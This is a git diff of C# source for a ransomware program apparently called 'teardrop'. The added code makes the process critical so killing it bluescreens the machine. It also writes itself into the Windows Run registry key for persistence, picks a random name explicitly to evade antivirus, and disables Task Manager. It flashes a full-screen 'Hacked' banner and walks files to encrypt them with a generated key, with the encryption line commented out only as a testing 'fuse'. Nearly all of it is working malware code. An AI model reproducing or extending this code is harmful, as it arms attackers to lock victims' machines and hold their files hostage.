@@ -24,6 +24,25 @@ namespace teardrop
             InitializeComponent();
         }
 
+        bool debug = Properties.Settings.Default.debug;
+        public static class Make
+        {
+            [DllImport("ntdll.dll", SetLastError = true)]
+            private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+
+            public static void ProcessUnkillable()
+            {
+                Process.EnterDebugMode();
+                RtlSetProcessIsCritical(1, 0, 0);
+            }
+
+            public static void ProcessKillable()
+            {
+                RtlSetProcessIsCritical(0, 0, 0);
+            }
+        }
+
+
         public void Log(string text, string title)
         {
             try
@@ -36,23 +55,94 @@ namespace teardrop
             } catch { }
         }
 
+        private void RegisterStartup(bool isChecked)
+        {
+            try
+            {
+                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
+                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                if (isChecked)
+                {
+                    registryKey.SetValue(Properties.Settings.Default.application_name, Application.ExecutablePath);
+                }
+                else
+                {
+                    registryKey.DeleteValue(Properties.Settings.Default.application_name);
+                }
+            }
+            catch(Exception ex)
+            {
+                Log(ex.Message, "RegisterStartUp");
+            }
+        }
 
-        private void Form1_Load(object sender, EventArgs e)
-        {           
+        private void setup()
+        {
             // Check if Encryption/Decryption Key was ever created on that machine
-            if(Properties.Settings.Default.key.Length != 34)
+            if (Properties.Settings.Default.key.Length != 34)
             {
                 Properties.Settings.Default.key = Crypto.GetRandomString(34);
                 Properties.Settings.Default.Save();
                 Properties.Settings.Default.Reload();
 
-                write("Generated key: " + Properties.Settings.Default.key);
+                if (debug == true)
+                {
+                    write("Generated key: " + Properties.Settings.Default.key);
+                }
 
             }
             else
             {
-                write("Key is: " + Properties.Settings.Default.key);
+                if (debug == true)
+                {
+                    write("Key is: " + Properties.Settings.Default.key);
+                }
             }
+
+
+            // Check if Application name is already set. If not, generate one
+            // This should be random to try to be undetected from Anti-Virus
+            if (Properties.Settings.Default.application_name.Length != 12)
+            {
+                Properties.Settings.Default.application_name = Crypto.GetRandomString(12);
+                Properties.Settings.Default.Save();
+                Properties.Settings.Default.Reload();
+
+                if (debug == true)
+                {
+                    if (debug == true)
+                    {
+                        write("Generated Application Name: " + Properties.Settings.Default.application_name);
+                    }
+
+                    Log("Generated Application Name: " + Properties.Settings.Default.application_name, "Form1_Load > Generate Application Name");
+                }
+
+            }
+            else
+            {
+                if (debug == true)
+                {
+                    write("Key is: " + Properties.Settings.Default.key);
+                }
+            }
+
+
+            // Make the process unkillable. It process is terminated,
+            // A bluescreen will appear.
+            if (Properties.Settings.Default.unkillable == true)
+            {
+                Make.ProcessUnkillable();
+            }
+            else if (Properties.Settings.Default.unkillable == false)
+            {
+                Make.ProcessKillable();
+            }
+            else
+            {
+                Log("Unable to detect setting for making application unkillable", "Form1_Load > Unkillable");
+            }
+
 
             // If disable_taskmgr is true, disable task manager. else, enable.
             if (Properties.Settings.Default.disable_taskmgr == true)
@@ -79,6 +169,61 @@ namespace teardrop
             }
 
 
+            // Check what kind of theme is selected. You can find more information about this in Github Wiki
+            if(Properties.Settings.Default.theme == "default")
+            {
+                panel_theme_flash.Visible = false;
+                panel_theme_flash.Enabled = false;
+            }
+            else if(Properties.Settings.Default.theme == "flash")
+            {
+                // Set Window to be Fullscreen and overlap
+                this.WindowState = FormWindowState.Maximized;
+                this.FormBorderStyle = FormBorderStyle.None;
+
+                // Enable the Panel Control and make it fill the Screen
+                panel_theme_flash.Visible = true;
+                panel_theme_flash.Enabled = true;
+                panel_theme_flash.Dock = DockStyle.Fill;
+                
+                // Position the Label and set its Text
+                label_theme_flash.Text = "Hacked";
+                label_theme_flash.Font = new Font(label_theme_flash.Font.FontFamily, this.Height / 16, label_theme_flash.Font.Style);
+                label_theme_flash.Location = new Point((panel_theme_flash.Width / 2) - (label_theme_flash.Width / 2), (panel_theme_flash.Height / 2) - (label_theme_flash.Height / 2));
+
+                // Setting up the Timer and the method
+                timer_theme_lash.Enabled = true;
+                timer_theme_lash.Interval = 1000;
+                timer_theme_lash.Tick += new EventHandler(timer_theme_flash_tick);
+            }
+        }
+
+        private void timer_theme_flash_tick(object sender, EventArgs e)
+        {
+            // Switches the Color of the Panel and Label
+
+            Color backcolor = Color.Red;
+            Color forecolor = Color.Black;
+
+            if(panel_theme_flash.BackColor == backcolor)
+            {
+                panel_theme_flash.BackColor = forecolor;
+                label_theme_flash.ForeColor = backcolor;
+            }
+            else
+            {
+                panel_theme_flash.BackColor = backcolor;
+                label_theme_flash.ForeColor = forecolor;
+            }
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            // Check if generated Strings are set like Application Name, Encryption Key, etc...
+            setup();
+            RegisterStartup(true);
+
+
             // Simple "Styling"
             this.ShowInTaskbar = false;
             this.Text = "";
@@ -92,10 +237,11 @@ namespace teardrop
             label1.Text = Properties.Settings.Default.application_title;
 
             // Center Visuals
-            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
             label1.Location = new Point(panel_main.Width / 2 - label1.Width / 2, label1.Location.Y);
+            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
 
             string deviceId = "";
+
 
             try
             {
@@ -109,9 +255,11 @@ namespace teardrop
             }
             catch(Exception DeviceIdError)
             {
-                Log(DeviceIdError.Message, "Form1_Load > DevideId");
+                Log(DeviceIdError.Message, "Form1_Load > DeviceId");
             }
 
+
+            // Connection String for MySQL Connection, if enabled.
             string myConnectionString = "SERVER=" + Properties.Settings.Default.db_host + ";" +
                             "DATABASE=" + Properties.Settings.Default.db_database + ";" +
                             "UID=" + Properties.Settings.Default.db_user + ";" +
@@ -222,7 +370,9 @@ namespace teardrop
 
                                 if (validExtensions.Contains(ext.ToLower()))
                                 {
-                                    //Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
+                                    // This now acts like a fuse so you dont accidentaly encrypt your own hard drive while testing.
+                                    // Srly... use a VM
+                                    // Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
 
                                     try
                                     {
